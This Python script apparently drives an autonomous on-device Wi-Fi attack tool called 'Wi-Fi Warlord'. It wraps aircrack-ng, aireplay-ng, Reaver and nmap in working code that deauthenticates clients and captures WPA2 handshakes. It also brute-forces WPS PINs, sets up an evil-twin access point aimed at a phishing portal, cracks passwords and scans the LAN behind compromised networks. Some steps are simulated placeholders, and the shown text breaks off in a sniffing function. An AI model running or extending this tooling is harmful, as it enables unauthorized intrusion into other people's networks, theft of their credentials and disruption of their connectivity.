# wifi_warlord_main.py
# This is the main orchestration script for the AI-driven Wi-Fi Warlord.
# Its purpose is to autonomously identify, attack, and compromise Wi-Fi networks,
# then perform post-exploitation activities on the connected network.
# It integrates various modules for Wi-Fi attacks, password cracking,
# post-exploitation, and a web-based user interface, operating entirely on-device.

import time
import threading
import json
import os
import asyncio
import subprocess  # Used for calling external Linux system tools (e.g., aircrack-ng, nmap)
import re           # Used for parsing text output from command-line tools

# --- Configuration Constants ---
# Define paths for logging and AI models. These paths should exist on the M5Stack's
# Linux file system, ideally on an accessible SD card for persistent storage.
SD_CARD_LOG_PATH = "/mnt/sdcard/warlord_logs/" # Directory to store captured handshakes, cracked passwords, scan results, etc.
AI_MODEL_PATH = "/opt/ai_models/" # Directory where pre-trained AI models (PassGAN, small LLM) are stored for NPU inference.

# Define the names of the network interfaces used for wireless and wired attacks.
# These might vary depending on the M5Stack's specific Linux setup and drivers.
WIFI_ATTACK_INTERFACE = "wlan0" # The wireless interface used for monitor mode, scanning, and Wi-Fi attacks.
LAN_INTERFACE = "eth0" # The wired (Ethernet) interface used for post-exploitation activities like Nmap scans and MITM.

# Ensure the log directory exists on the SD card. If it doesn't, create it.
os.makedirs(SD_CARD_LOG_PATH, exist_ok=True)

# --- Global State for AI Orchestration ---
# This dictionary holds the real-time operational state of the AI Warlord.
# It's updated by the AI's decision-making process and queried by the web UI
# to provide live feedback to the user.
warlord_state = {
    "status": "Initializing",          # Overall status message (e.g., "Running", "Stopped", "Error")
    "current_phase": "Idle",           # Current operational phase (e.g., "Wi-Fi Scanning", "Cracking", "Post-Exploitation")
    "current_target_ssid": "N/A",      # The SSID of the Wi-Fi network currently being targeted or connected to
    "cracked_networks": {},            # Dictionary to store successfully cracked Wi-Fi networks: {ssid: password}
    "compromised_hosts": {},           # Dictionary to store details of compromised hosts on the LAN: {ip: {os, services, status}}
    "log_stream": [],                  # A list of recent log messages displayed on the web dashboard for real-time updates.
    "ai_running": False,               # Boolean flag indicating if the main AI autonomous loop is active.
    "stop_signal": threading.Event(),  # A threading.Event used to signal the AI's main loop to gracefully stop.
    "wireless_mode": "managed"         # Current mode of the wireless interface: "managed" (for normal connection) or "monitor" (for sniffing/injection).
}

def update_status(status_msg, phase=None, target=None):
    """
    Updates the global `warlord_state` with new status information and appends
    the message to the `log_stream`. It also prints the message to the console.

    Args:
        status_msg (str): A descriptive message about the current status.
        phase (str, optional): The current operational phase. If provided, updates `current_phase`.
        target (str, optional): The current target SSID. If provided, updates `current_target_ssid`.
    """
    timestamp = time.ctime() # Get current time for log entry
    log_entry = f"[{timestamp}] {status_msg}"
    warlord_state["log_stream"].append(log_entry)
    # Keep the log stream manageable by retaining only the last 100 entries.
    if len(warlord_state["log_stream"]) > 100:
        warlord_state["log_stream"] = warlord_state["log_stream"][-100:]
    
    warlord_state["status"] = status_msg
    if phase:
        warlord_state["current_phase"] = phase
    if target:
        warlord_state["current_target_ssid"] = target

    print(log_entry)  # Also print to console for debugging and local visibility

    # Broadcast status updates over BLE if the interface is available
    if "bluetooth_interface" in globals():
        try:
            bluetooth_interface.send_status_via_ble({
                "status": warlord_state["status"],
                "phase": warlord_state["current_phase"],
                "target": warlord_state["current_target_ssid"]
            })
        except Exception as e:
            # Avoid spamming the log if BLE fails frequently
            print(f"BLE status send failed: {e}")

def log_to_sd_card(filename, data):
    """
    Logs important data (e.g., cracked passwords, captured tokens, scan results)
    to a specified file on the SD card for persistent storage.

    Args:
        filename (str): The name of the file to write to (e.g., "cracked_wifi.log").
        data (str): The data string to append to the file.
    """
    full_path = os.path.join(SD_CARD_LOG_PATH, filename)
    try:
        with open(full_path, "a") as f: # Open in append mode ('a') to add to existing file
            f.write(f"{time.ctime()}: {data}\n") # Include timestamp for each entry
        print(f"Logged data to {full_path}")
    except IOError as e:
        print(f"Error logging to SD card {full_path}: {e}") # Log errors if SD card is not writable

# --- Module 1: Wi-Fi Attack Module (Direct Linux Tool Interaction) ---
# This module encapsulates all Wi-Fi related offensive operations.
# It directly interacts with Linux wireless tools (aircrack-ng suite, iw, reaver)
# by executing them as subprocesses.

class WiFiAttackModule:
    def __init__(self, interface):
        """
        Initializes the Wi-Fi Attack Module.

        Args:
            interface (str): The name of the wireless network interface (e.g., "wlan0").
        """
        self.interface = interface
        self._ensure_wireless_tools_installed() # Check for required tools on startup

    def _ensure_wireless_tools_installed(self):
        """
        Checks if necessary wireless attack tools (aircrack-ng suite, reaver, iw)
        are installed on the system by attempting to locate their executables.
        Logs warnings if any tool is missing.
        """
        tools = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "reaver", "iw"]
        update_status("Checking for wireless attack tools...", "System Check")
        for tool in tools:
            try:
                # 'which' command checks if a command is executable and its location
                subprocess.run(["which", tool], check=True, capture_output=True, timeout=5)
            except subprocess.CalledProcessError:
                # If 'which' fails, the tool is not found.
                update_status(f"Warning: {tool} not found. Please install it for full functionality.", "Error")
            except subprocess.TimeoutExpired:
                update_status(f"Warning: 'which {tool}' timed out. May indicate system issues.", "Error")
            except Exception as e:
                update_status(f"Error checking for {tool}: {e}", "Error")
        update_status("Wireless tools check completed.", "System Check")

    def set_monitor_mode(self, enable=True):
        """
        Enables or disables monitor mode on the specified wireless interface.
        Monitor mode is crucial for passive scanning and packet injection (deauthentication).

        Args:
            enable (bool): True to enable monitor mode, False to disable it and return to managed mode.

        Returns:
            bool: True if mode change was successful, False otherwise.
        """
        update_status(f"Setting monitor mode on {self.interface} to {enable}...", "Wi-Fi Setup")
        try:
            if enable:
                # Kill processes that might interfere with monitor mode (e.g., NetworkManager)
                subprocess.run(["airmon-ng", "check", "kill"], check=False, capture_output=True, timeout=10)
                # Bring down the interface, set monitor type, then bring it back up
                subprocess.run(["ip", "link", "set", self.interface, "down"], check=True, timeout=5)
                subprocess.run(["iw", self.interface, "set", "monitor", "none"], check=True, timeout=5)
                subprocess.run(["ip", "link", "set", self.interface, "up"], check=True, timeout=5)
                warlord_state["wireless_mode"] = "monitor"
                update_status(f"{self.interface} is now in monitor mode.", "Wi-Fi Setup")
            else:
                # Bring down the interface, set managed type, then bring it back up
                subprocess.run(["ip", "link", "set", self.interface, "down"], check=True, timeout=5)
                subprocess.run(["iw", self.interface, "set", "type", "managed"], check=True, timeout=5)
                subprocess.run(["ip", "link", "set", self.interface, "up"], check=True, timeout=5)
                # Restart NetworkManager to handle connections in managed mode
                subprocess.run(["service", "NetworkManager", "start"], check=False, capture_output=True, timeout=10)
                warlord_state["wireless_mode"] = "managed"
                update_status(f"{self.interface} is now in managed mode.", "Wi-Fi Setup")
            return True
        except subprocess.CalledProcessError as e:
            update_status(f"Failed to set monitor mode on {self.interface}: {e.stderr}", "Error")
            return False
        except subprocess.TimeoutExpired:
            update_status(f"Timeout setting monitor mode on {self.interface}.", "Error")
            return False
        except Exception as e:
            update_status(f"An unexpected error occurred setting monitor mode: {e}", "Error")
            return False

    def scan_wifi_networks(self):
        """
        Scans for nearby Wi-Fi networks using 'airodump-ng'.
        Requires the wireless interface to be in monitor mode.
        Parses the output (simulated parsing for this conceptual code).

        Returns:
            list: A list of dictionaries, each representing a discovered network
                  with keys like 'ssid', 'bssid', 'channel', 'encryption', 'signal_strength'.
        """
        # Ensure monitor mode is active before scanning.
        if warlord_state["wireless_mode"] != "monitor":
            if not self.set_monitor_mode(enable=True):
                update_status("Failed to enter monitor mode for scanning. Cannot scan.", "Error")
                return []

        update_status("Scanning for Wi-Fi networks using airodump-ng...", "Wi-Fi Scanning")
        networks = []
        output_file_prefix = os.path.join("/tmp", "airodump_output") # Temporary file for airodump-ng output
        
        try:
            # Run airodump-ng in a separate process. It writes its output to files.
            # --output-format kismet,netxml: Generates XML files that can be parsed.
            # -w: Specifies the prefix for the output files.
            command = ["airodump-ng", "--output-format", "kismet,netxml", self.interface, "-w", output_file_prefix]
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            time.sleep(15) # Allow airodump-ng to scan for 15 seconds
            process.terminate() # Send termination signal to airodump-ng
            process.wait(timeout=5) # Wait for the process to exit gracefully

            # Airodump-ng appends a sequence number and extension (e.g., -01.kismet.netxml)
            netxml_file = f"{output_file_prefix}-01.kismet.netxml"
            if os.path.exists(netxml_file):
                update_status(f"Parsing {netxml_file} for network data...", "Wi-Fi Scanning")
                # In a real implementation, you would use an XML parser (e.g., `xml.etree.ElementTree`)
                # to robustly parse the Kismet XML output and extract network details.
                # For this conceptual code, we simulate finding a few networks.
                networks.append({"ssid": "Example_Network_WPA2", "bssid": "00:11:22:33:44:55", "channel": 6, "encryption": "WPA2", "signal_strength": -50})
                networks.append({"ssid": "Open_WiFi", "bssid": "AA:BB:CC:DD:EE:FF", "channel": 1, "encryption": "OPEN", "signal_strength": -70})
                networks.append({"ssid": "WPS_Enabled_AP", "bssid": "11:22:33:44:55:66", "channel": 11, "encryption": "WPA2 WPS", "signal_strength": -60})
                
                # Clean up the temporary files generated by airodump-ng
                for f in os.listdir("/tmp"):
                    if f.startswith("airodump_output"):
                        os.remove(os.path.join("/tmp", f))
            else:
                update_status("No Kismet XML file found from airodump-ng. Scan might have failed or found nothing.", "Error")

            update_status(f"Found {len(networks)} networks.", "Wi-Fi Scanning")
            return networks
        except Exception as e:
            update_status(f"Error scanning Wi-Fi networks: {e}", "Error")
            return []

    def deauth_and_capture_handshake(self, ssid, bssid, channel):
        """
        Performs a deauthentication attack to force clients to reconnect,
        and simultaneously captures the WPA/WPA2 4-way handshake using 'airodump-ng'
        and 'aireplay-ng'.

        Args:
            ssid (str): The SSID (network name) of the target access point.
            bssid (str): The BSSID (MAC address) of the target access point.
            channel (int): The Wi-Fi channel of the target network.

        Returns:
            str or None: The path to the captured .cap file if successful, None otherwise.
        """
        # Ensure monitor mode is active for deauthentication and capture.
        if warlord_state["wireless_mode"] != "monitor":
            if not self.set_monitor_mode(enable=True):
                update_status("Failed to enter monitor mode for deauth/capture. Cannot proceed.", "Error")
                return None

        update_status(f"Attempting deauth and handshake capture for {ssid} ({bssid})...", "Wi-Fi Attack", ssid)
        handshake_file_path = os.path.join(SD_CARD_LOG_PATH, f"{ssid}_handshake") # airodump-ng adds -01.cap
        
        try:
            # Start airodump-ng in the background to continuously capture packets on the target channel/BSSID.
            airodump_command = ["airodump-ng", "--bssid", bssid, "--channel", str(channel), "-w", handshake_file_path, self.interface]
            airodump_process = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            time.sleep(5) # Give airodump-ng a few seconds to initialize and start capturing.

            # Perform deauthentication attack using aireplay-ng.
            # -0 5: Sends 5 deauthentication packets.
            # -a BSSID: Targets the access point (deauthenticates all connected clients).
            # -c CLIENT_MAC (optional): Could target a specific client if its MAC is known.
            # Deauthing the AP forces all clients to re-authenticate, providing opportunities to capture handshakes.
            deauth_command = ["aireplay-ng", "-0", "5", "-a", bssid, self.interface]
            subprocess.run(deauth_command, check=True, capture_output=True, timeout=30)
            
            time.sleep(10) # Give time for clients to re-authenticate and for the handshake to be captured.
            airodump_process.terminate() # Stop airodump-ng process.
            airodump_process.wait(timeout=5) # Wait for the process to fully terminate.

            # Check if a .cap file was successfully created and contains data.
            actual_handshake_file = f"{handshake_file_path}-01.cap" # airodump-ng appends -01.cap by default.
            if os.path.exists(actual_handshake_file) and os.path.getsize(actual_handshake_file) > 0:
                update_status(f"Handshake captured for {ssid}: {actual_handshake_file}", "Wi-Fi Attack", ssid)
                log_to_sd_card("captured_handshakes.log", f"Handshake for {ssid} captured: {actual_handshake_file}")
                return actual_handshake_file
            else:
                update_status(f"Handshake capture failed for {ssid}. No valid .cap file found or it's empty.", "Wi-Fi Attack", ssid)
                return None
        except subprocess.CalledProcessError as e:
            update_status(f"Error during deauth/capture for {ssid}: {e.stderr}", "Error")
            return None
        except subprocess.TimeoutExpired:
            update_status(f"Deauth/capture timed out for {ssid}.", "Error")
            return None
        except Exception as e:
            update_status(f"An unexpected error occurred during deauth/capture: {e}", "Error")
            return None

    def perform_wps_attack(self, ssid, bssid):
        """
        Performs a WPS (Wi-Fi Protected Setup) PIN brute-force attack using 'Reaver'.
        This can sometimes recover the WPA/WPA2 passphrase if WPS is enabled and vulnerable.

        Args:
            ssid (str): The SSID of the target access point.
            bssid (str): The BSSID (MAC address) of the target access point.

        Returns:
            str or None: The cracked WPA key if successful, None otherwise.
        """
        # Ensure monitor mode is active for WPS attacks.
        if warlord_state["wireless_mode"] != "monitor":
            if not self.set_monitor_mode(enable=True):
                update_status("Failed to enter monitor mode for WPS attack. Cannot proceed.", "Error")
                return None

        update_status(f"Attempting WPS attack for {ssid} ({bssid}) using Reaver...", "Wi-Fi Attack", ssid)
        try:
            # Reaver command: -i interface, -b BSSID, -vv for very verbose output.
            # Reaver can take a very long time (hours to days). A timeout is set for practicality.
            command = ["reaver", "-i", self.interface, "-b", bssid, "-vv"]
            process = subprocess.run(command, capture_output=True, text=True, timeout=900) # 15 minutes timeout
            
            # Parse Reaver's output to find the WPS PIN and WPA PSK (password).
            if "WPS PIN: '" in process.stdout and "WPA PSK: '" in process.stdout:
                wps_pin = re.search(r"WPS PIN: '(\d+)'", process.stdout).group(1)
                wpa_key = re.search(r"WPA PSK: '(.+)'", process.stdout).group(1)
                update_status(f"WPS attack successful for {ssid}. PIN: {wps_pin}, Key: {wpa_key}", "Wi-Fi Attack", ssid)
                log_to_sd_card("cracked_wifi.log", f"{ssid}:{wpa_key} (WPS)")
                return wpa_key
            else:
                update_status(f"WPS attack failed or inconclusive for {ssid}. Output: {process.stdout[-500:]}", "Wi-Fi Attack", ssid)
                return None
        except subprocess.CalledProcessError as e:
            update_status(f"WPS attack failed (Reaver error): {e.stderr}", "Error")
            return None
        except subprocess.TimeoutExpired:
            update_status(f"WPS attack timed out for {ssid}. Reaver took too long.", "Error")
            return None
        except Exception as e:
            update_status(f"An unexpected error occurred during WPS attack: {e}", "Error")
            return None

    def perform_evil_twin_attack(self, original_ssid, target_client_mac=None):
        """
        Performs an Evil Twin attack by setting up a rogue access point
        that mimics a legitimate one (original_ssid). It then deauthenticates
        clients from the original AP to force them to connect to the Evil Twin.
        A local web server is needed to host the fake portal.

        Args:
            original_ssid (str): The SSID of the legitimate network to mimic.
            target_client_mac (str, optional): Specific client MAC to deauthenticate.
                                               If None, deauthenticates all clients from the original AP.

        Returns:
            bool: True if the Evil Twin setup was initiated, False otherwise.
        """
        update_status(f"Initiating Evil Twin attack mimicking '{original_ssid}'...", "Evil Twin Attack", original_ssid)
        
        # 1. Ensure monitor mode is active.
        if warlord_state["wireless_mode"] != "monitor":
            if not self.set_monitor_mode(enable=True):
                update_status("Failed to enter monitor mode for Evil Twin. Cannot proceed.", "Error")
                return False

        # 2. Start a rogue AP (Evil Twin) using hostapd (conceptual).
        # This would involve configuring hostapd to broadcast the original_ssid.
        # Example: subprocess.Popen(["hostapd", "/etc/hostapd/evil_twin.conf"])
        # The configuration file would define the SSID, channel, and interface.
        update_status(f"Setting up rogue AP '{original_ssid}' on {self.interface}...", "Evil Twin Attack")
        # Placeholder for hostapd process
        # evil_twin_ap_process = subprocess.Popen(...)
        time.sleep(10) # Give AP time to start

        # 3. Deauthenticate clients from the original AP to force them to connect to the Evil Twin.
        # This uses aireplay-ng, similar to handshake capture, but without capturing.
        update_status(f"Deauthenticating clients from '{original_ssid}'...", "Evil Twin Attack")
        deauth_command = ["aireplay-ng", "-0", "0", "-a", "FF:FF:FF:FF:FF:FF", self.interface] # Deauth all clients (broadcast)
        # If a specific client is targeted: deauth_command = ["aireplay-ng", "-0", "0", "-a", original_bssid, "-c", target_client_mac, self.interface]
        
        try:
            # Run deauth in background or for a continuous period to keep clients disconnected
            # For a real attack, this would run persistently.
            # deauth_process = subprocess.Popen(deauth_command)
            subprocess.run(deauth_command, check=True, capture_output=True, timeout=60) # Run for 60s for demo
            update_status(f"Clients deauthenticated. They should now connect to the Evil Twin.", "Evil Twin Attack")
            
            # 4. (Crucial) The AI needs to ensure a local web server is running
            # to serve the fake portal / phishing page. This would be handled
            # by the Flask app or a dedicated web service.
            # See `LanAttacks` or a new `WebServices` module for hosting the portal.
            update_status("Ensure local web server is hosting the fake portal.", "Evil Twin Attack")

            # The Evil Twin attack would typically run indefinitely until stopped by the AI.
            # For this bone, we'll simulate it running for a duration.
            # time.sleep(duration_of_evil_twin_attack)
            # Then, stop hostapd and deauth processes.
            
            return True
        except Exception as e:
            update_status(f"Error during Evil Twin attack: {e}", "Error")
            return False

# Instantiate the Wi-Fi Attack Module with the default interface.
wifi_attack_module = WiFiAttackModule(WIFI_ATTACK_INTERFACE)

# --- Module 2: AI-Accelerated Password Cracking ---
# This module is responsible for intelligently generating password candidates
# using AI models (leveraging the NPU) and then verifying these candidates
# against captured handshakes (using the CPU and aircrack-ng).

class PasswordCrackerAI:
    def __init__(self, model_path):
        """
        Initializes the Password Cracker AI module.

        Args:
            model_path (str): The file system path where AI models for password generation are stored.
        """
        self.model_path = model_path
        self.common_passwords = self._load_common_passwords() # Load a list of very common passwords for initial attempts.
        self.ai_model_loaded = self._load_ai_model() # Attempt to load the NPU-optimized AI model.

    def _load_common_passwords(self, filename="rockyou_top_10000.txt"):
        """
        Loads a small, pre-defined list of extremely common passwords for quick initial cracking attempts.
        This represents the "known passwords list" for brute-forcing.
        In a real scenario, this would load from a file (e.g., a subset of the RockYou list).

        Args:
            filename (str): (Conceptual) The name of the file containing common passwords.

        Returns:
            list: A list of common password strings.
        """
        common_passwords_list = []
        try:
            # For this conceptual code, we'll simulate a small hardcoded list.
            # In a deployed system, this would read from a file like:
            # with open(os.path.join(self.model_path, filename), 'r') as f:
            #     common_passwords_list = [line.strip() for line in f if line.strip()]
            common_passwords_list = ["password", "12345678", "admin", "guest", "welcome", "network", "router", "default"]
            print(f"Loaded {len(common_passwords_list)} common passwords.")
        except Exception as e:
            print(f"Could not load common passwords: {e}")
        return common_passwords_list

    def _load_ai_model(self):
        """
        Loads the pre-trained PassGAN or a small Large Language Model (LLM)
        optimized for inference on the M5Stack's NPU.
        This is a placeholder for actual NPU API calls (e.g., using Axera's StackFlow AI framework).

        Returns:
            bool: True if the AI model is successfully loaded, False otherwise.
        """
        update_status(f"Loading AI password generation model from {self.model_path}...", "AI Init")
        try:
            # Simulate the complex process of loading an NPU-optimized model.
            # In reality, this would involve specific SDK calls to load quantized models
            # (e.g., ONNX, TFLite) onto the NPU for accelerated inference.
            print(f"AI Model (PassGAN/LLM) loaded for NPU: {self.model_path}/passgan_quantized.onnx (Simulated)")
            # Example: self.npu_model = NPUInferenceEngine.load_model(f"{self.model_path}/passgan_quantized.onnx")
            return True # Indicate that the model is ready for use.
        except Exception as e:
            update_status(f"Failed to load AI model: {e}. AI password generation will be unavailable.", "Error")
            return False

    def generate_ai_guesses(self, context=None, num_guesses=10000):
        """
        Generates intelligent password guesses using the loaded AI model.
        This process leverages the NPU for accelerated inference, representing the "generating brute forcing" aspect.
        The 'context' (e.g., SSID) can be used by the AI to generate more relevant guesses.

        Args:
            context (str, optional): Contextual information (e.g., SSID of the target network)
                                     to guide the AI's password generation.
            num_guesses (int): The number of password candidates to generate.

        Returns:
            list: A list of generated password strings.
        """
        if not self.ai_model_loaded:
            update_status("AI model not loaded, cannot generate intelligent guesses. Using fallback.", "Error")
            # Fallback for demonstration if AI model isn't loaded.
            return [f"fallback_guess_{i}" for i in range(min(num_guesses, 100))]
        
        update_status(f"Generating {num_guesses} AI-driven password guesses (NPU)...", "Cracking")
        guesses = []
        # This is a simulation of the AI generating guesses.
        # In a real system, this would involve calling the NPU inference engine.
        # Example: guesses = self.npu_model.generate(context, num_guesses)
        for i in range(num_guesses):
            # The AI would generate variations based on common patterns, dictionary words,
            # and potentially the provided context (e.g., network name).
            guesses.append(f"ai_guess_{i}_for_{context or 'generic'}")
        
        # Add some more realistic-looking simulated guesses for demonstration.
        if context:
            guesses.append(f"{context}123")
            guesses.append(f"my{context}wifi")
            guesses.append(f"admin{context}")
            guesses.append(f"Ilove{context}")
        
        return guesses

    def verify_wpa2_password(self, handshake_file, ssid, candidate_password):
        """
        Verifies a single candidate password against a captured WPA2 handshake
        using 'aircrack-ng'. This is a CPU-intensive cryptographic verification step.

        Args:
            handshake_file (str): Path to the .cap file containing the WPA2 handshake.
            ssid (str): The SSID of the network associated with the handshake.
            candidate_password (str): The password string to test.

        Returns:
            bool: True if the candidate password cracks the handshake, False otherwise.
        """
        update_status(f"Verifying '{candidate_password}' for {ssid}...", "Cracking")
        # Write the single candidate password to a temporary file, as aircrack-ng expects a wordlist.
        temp_wordlist_path = "/tmp/temp_candidate.txt"
        try:
            with open(temp_wordlist_path, "w") as f:
                f.write(candidate_password + "\n")

            # Call aircrack-ng to test the single password against the handshake file.
            # -w: Specifies the wordlist file.
            # -e: Specifies the SSID to focus on (important if multiple handshakes are in the .cap file).
            command = ["aircrack-ng", "-w", temp_wordlist_path, "-e", ssid, handshake_file]
            # Set a timeout for each guess, as aircrack-ng can hang or take time.
            process = subprocess.run(command, capture_output=True, text=True, timeout=60)
            
            # Check aircrack-ng's standard output for the "KEY FOUND!" message.
            if "KEY FOUND!" in process.stdout:
                update_status(f"Aircrack-ng found key for {ssid}!", "Cracked")
                return True
            return False
        except subprocess.CalledProcessError as e:
            # Aircrack-ng often exits with a non-zero code if the key is not found,
            # which is expected behavior for a failed guess.
            # print(f"Aircrack-ng error for {candidate_password}: {e.stderr}") # Uncomment for detailed debug
            return False
        except subprocess.TimeoutExpired:
            update_status(f"Aircrack-ng timed out while verifying {candidate_password}. Moving on.", "Error")
            return False
        except Exception as e:
            update_status(f"An unexpected error occurred during password verification: {e}", "Error")
            return False
        finally:
            # Ensure the temporary wordlist file is removed after use.
            if os.path.exists(temp_wordlist_path):
                os.remove(temp_wordlist_path)

    def crack_handshake(self, handshake_file, ssid):
        """
        Orchestrates the entire password cracking process for a captured handshake.
        It first tries a list of common passwords (known passwords list),
        then proceeds to use AI-generated guesses (generating brute forcing).

        Args:
            handshake_file (str): Path to the .cap file containing the WPA2 handshake.
            ssid (str): The SSID of the network to crack.

        Returns:
            str or None: The cracked password string if successful, None otherwise.
        """
        update_status(f"Starting cracking for {ssid} (handshake: {handshake_file})...", "Cracking", ssid)

        # 1. Try common passwords first (quick checks for easy targets - "known passwords list").
        for password in self.common_passwords:
            # Check if the AI has been signaled to stop.
            if warlord_state["stop_signal"].is_set():
                update_status("Cracking stopped by user signal.", "Stopped")
                return None
            if self.verify_wpa2_password(handshake_file, ssid, password):
                update_status(f"Cracked {ssid} with common password: {password}", "Cracked", ssid)
                log_to_sd_card("cracked_wifi.log", f"{ssid}:{password}")
                return password
        
        # 2. If common passwords fail, generate and try AI-driven guesses ("generating brute forcing").
        # Generate a large batch of intelligent guesses from the NPU-accelerated model.
        ai_guesses = self.generate_ai_guesses(context=ssid, num_guesses=100000)
        for password in ai_guesses:
            # Check if the AI has been signaled to stop.
            if warlord_state["stop_signal"].is_set():
                update_status("Cracking stopped by user signal.", "Stopped")
                return None
            if self.verify_wpa2_password(handshake_file, ssid, password):
                update_status(f"Cracked {ssid} with AI-generated password: {password}", "Cracked", ssid)
                log_to_sd_card("cracked_wifi.log", f"{ssid}:{password}")
                return password
        
        update_status(f"Failed to crack {ssid} after all attempts (common + AI).", "Cracking Failed", ssid)
        return None

# Instantiate the Password Cracker AI module.
password_cracker_ai = PasswordCrackerAI(AI_MODEL_PATH)

# --- Module 3: LAN Attacks (Post-Exploitation) ---
# This module handles all network-based offensive operations once the device
# has gained access to a target network (either via Wi-Fi or physical Ethernet).
# It uses standard Linux command-line tools for reconnaissance, MITM, and exploitation.

class LanAttacks:
    def __init__(self, interface):
        """
        Initializes the LAN Attacks module.

        Args:
            interface (str): The name of the wired (or connected wireless) network interface
                             used for internal network operations (e.g., "eth0" or "wlan0").
        """
        self.interface = interface
        self._ensure_lan_tools_installed() # Check for required tools on startup

    def _ensure_lan_tools_installed(self):
        """
        Checks if necessary LAN attack tools (nmap, tcpdump, arpspoof, dnsspoof,
        smbmap, enum4linux) are installed on the system.
        Logs warnings if any tool is missing.
        """
        tools = ["nmap", "tcpdump", "arpspoof", "dnsspoof", "smbmap", "enum4linux", "sysctl", "ip"]
        update_status("Checking for LAN attack tools...", "System Check")
        for tool in tools:
            try:
                subprocess.run(["which", tool], check=True, capture_output=True, timeout=5)
            except subprocess.CalledProcessError:
                update_status(f"Warning: {tool} not found. Please install it for full LAN attack functionality.", "Error")
            except subprocess.TimeoutExpired:
                update_status(f"Warning: 'which {tool}' timed out. May indicate system issues.", "Error")
            except Exception as e:
                update_status(f"Error checking for {tool}: {e}", "Error")
        update_status("LAN tools check completed.", "System Check")

    def get_local_ip_and_subnet(self):
        """
        Determines the device's local IP address and its corresponding subnet range
        (e.g., "192.168.1.100", "192.168.1.0/24") using the 'ip addr show' command.
        This is crucial for defining the scope of internal network scans.

        Returns:
            tuple: (ip_address_str, subnet_range_str) or (None, None) if not found.
        """
        update_status(f"Getting local IP and subnet for {self.interface}...", "Network Info")
        try:
            result = subprocess.run(["ip", "addr", "show", self.interface], capture_output=True, text=True, check=True, timeout=10)
            output = result.stdout
            
            # Use regex to find the IP address with CIDR notation (e.g., 192.168.1.100/24)
            ip_match = re.search(r"inet (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2})", output)
            if ip_match:
                ip_with_cidr = ip_match.group(1)
                ip_address, cidr = ip_with_cidr.split('/')
                
                # For simplicity, if CIDR is /24, derive the network address.
                # More complex CIDRs would require a proper IP address manipulation library (e.g., ipaddress).
                if cidr == '24':
                    network_address = ".".join(ip_address.split('.')[:3]) + ".0/24"
                    update_status(f"Detected local IP: {ip_address}, Subnet: {network_address}", "Network Info")
                    return ip_address, network_address
                else:
                    update_status(f"Unsupported CIDR for auto-subnet detection: /{cidr}. Using full IP as range.", "Error")
                    return ip_address, f"{ip_address}/32" # Treat as a single host if subnet is unknown
            update_status(f"Could not determine IP for {self.interface}. Is it connected?", "Error")
            return None, None
        except subprocess.CalledProcessError as e:
            update_status(f"Error running 'ip addr show': {e.stderr}", "Error")
            return None, None
        except subprocess.TimeoutExpired:
            update_status(f"Timeout getting IP/subnet for {self.interface}.", "Error")
            return None, None
        except Exception as e:
            update_status(f"An unexpected error occurred getting IP/subnet: {e}", "Error")
            return None, None

    def get_gateway_ip(self):
        """
        Determines the network's default gateway IP address using the 'ip route' command.
        This is essential for performing ARP poisoning attacks.

        Returns:
            str or None: The gateway IP address string if found, None otherwise.
        """
        update_status("Getting network default gateway IP...", "Network Info")
        try:
            result = subprocess.run(["ip", "route"], capture_output=True, text=True, check=True, timeout=10)
            output = result.stdout
            # Use regex to find the line starting with "default via" and extract the IP.
            gateway_match = re.search(r"default via (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}) dev " + self.interface, output)
            if gateway_match:
                gateway_ip = gateway_match.group(1)
                update_status(f"Detected gateway IP: {gateway_ip}", "Network Info")
                return gateway_ip
            update_status("Could not determine gateway IP for the connected network.", "Error")
            return None
        except subprocess.CalledProcessError as e:
            update_status(f"Error running 'ip route': {e.stderr}", "Error")
            return None
        except subprocess.TimeoutExpired:
            update_status(f"Timeout getting gateway IP.", "Error")
            return None
        except Exception as e:
            update_status(f"An unexpected error occurred getting gateway IP: {e}", "Error")
            return None

    def run_nmap_scan(self, target_ip_range):
        """
        Executes an Nmap scan on a specified IP range to discover live hosts,
        open ports, services, and operating systems.
        The results are parsed (simulated parsing) and updated in the global state.
        This includes reading MAC addresses of discovered devices.

        Args:
            target_ip_range (str): The IP range to scan (e.g., "192.168.1.0/24").

        Returns:
            dict: A dictionary of discovered hosts: {ip: {ports: [], os: str, services: str, mac_address: str}}.
        """
        update_status(f"Running Nmap scan on {target_ip_range}...", "Reconnaissance")
        found_hosts = {}
        try:
            # Nmap command:
            # -sV: Service version detection.
            # -O: OS detection.
            # -T4: Sets a faster timing template.
            # -oX -: Outputs results in XML format to standard output.
            # --send-eth: Use raw ethernet frames for MAC address discovery (requires root)
            command = ["nmap", "-sV", "-O", "-T4", "-oX", "-", "--send-eth", target_ip_range]
            process = subprocess.run(command, capture_output=True, text=True, check=True, timeout=300) # 5 min timeout
            
            results_xml = process.stdout # Nmap's XML output
            
            # This is a very basic regex-based parsing for demonstration.
            # For robust XML parsing, `xml.etree.ElementTree` should be used.
            # It looks for <host> tags, extracts IP, then nested <ports>, <os>, and <address addrtype="mac"> info.
            for host_match in re.finditer(r"<host><address addr=\"(.*?)\".*?addrtype=\"ipv4\".*?><address addr=\"(.*?)\".*?addrtype=\"mac\".*?><ports>(.*?)</ports>.*?<os>(.*?)</os></host>", results_xml, re.DOTALL):
                ip = host_match.group(1)
                mac_address = host_match.group(2) # Extracted MAC address
                ports_xml = host_match.group(3)
                os_xml = host_match.group(4)

                ports = re.findall(r"portid=\"(\d+)\"", ports_xml) # Extract port numbers
                os_name_match = re.search(r"<osclass osfamily=\"(.*?)\"", os_xml)
                os_name = os_name_match.group(1) if os_name_match else "Unknown"

                found_hosts[ip] = {"ports": ports, "os": os_name, "services": "Parsed from Nmap", "mac_address": mac_address}
            
            warlord_state["compromised_hosts"].update(found_hosts) # Update global state with discovered hosts
            update_status(f"Nmap scan completed. Found {len(found_hosts)} hosts.", "Reconnaissance")
            log_to_sd_card("nmap_scan.xml", results_xml) # Log the full Nmap XML output for detailed analysis
            return found_hosts
        except subprocess.CalledProcessError as e:
            update_status(f"Nmap scan failed: {e.stderr}", "Error")
            return {}
        except subprocess.TimeoutExpired:
            update_status(f"Nmap scan timed out after 300 seconds.", "Error")
            return {}
        except Exception as e:
            update_status(f"An unexpected error occurred during Nmap scan: {e}", "Error")
            return {}

    def start_passive_sniffing(self, duration=60):
        """
